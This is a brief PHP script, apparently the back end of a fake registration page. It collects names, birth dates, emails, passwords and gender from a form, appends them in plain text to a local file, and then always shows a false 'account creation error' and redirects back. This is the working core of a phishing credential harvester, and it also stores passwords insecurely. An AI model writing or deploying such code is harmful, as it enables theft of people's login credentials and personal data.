<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $firstName = $_POST['firstName'];
    $lastName = $_POST['lastName'];
    $birthDate = $_POST['birthDate'];
    $email = $_POST['email'];
    $password = $_POST['pass'];
    $gender = $_POST['gender'];

    // Guardar datos en un archivo de texto
    $file = fopen('datos.txt', 'a');
    fwrite($file, "Nombre: $firstName, Apellido: $lastName, Fecha de Nacimiento: $birthDate, Email: $email, Contraseña: $password, Género: $gender\n");
    fwrite($file,"---------------------------------------------");
    fclose($file);

    // Mostrar un mensaje de error y redirigir al formulario de registro
    echo "<script>alert('Error al crear la cuenta. Por favor, intente nuevamente.'); window.location.href='../main.html';</script>";
}
?>
